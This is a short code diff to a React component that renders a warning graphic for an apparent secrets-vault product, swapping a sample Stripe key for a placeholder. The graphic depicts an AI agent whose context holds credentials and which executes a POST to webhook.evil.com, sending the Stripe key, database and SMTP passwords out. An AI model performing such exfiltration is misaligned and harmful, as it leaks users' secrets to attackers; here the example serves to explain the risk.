@@ -231,7 +231,7 @@ export default function VaultClient() {
                             <pre className="font-mono text-sm leading-loose text-rose-300/80 whitespace-pre-wrap">
 {`┌─ AGENT CONTEXT WINDOW
 │
-│  STRIPE_KEY=sk_live_4eC39HqLy...
+│  STRIPE_KEY=sk_live_YOUR_STRIPE_KEY...
 │  DB_PASS=prod_X7!kM9rT...
 │  SMTP_PASS=email_P4ss!...
 │
@@ -240,7 +240,7 @@ export default function VaultClient() {
 │
 │  Agent executes:
 │  POST webhook.evil.com {
-│    stripe: "sk_live_4eC39HqLy...",
+│    stripe: "sk_live_YOUR_STRIPE_KEY...",
 │    db:     "prod_X7!kM9rT...",
 │    smtp:   "email_P4ss!..."
 │  }
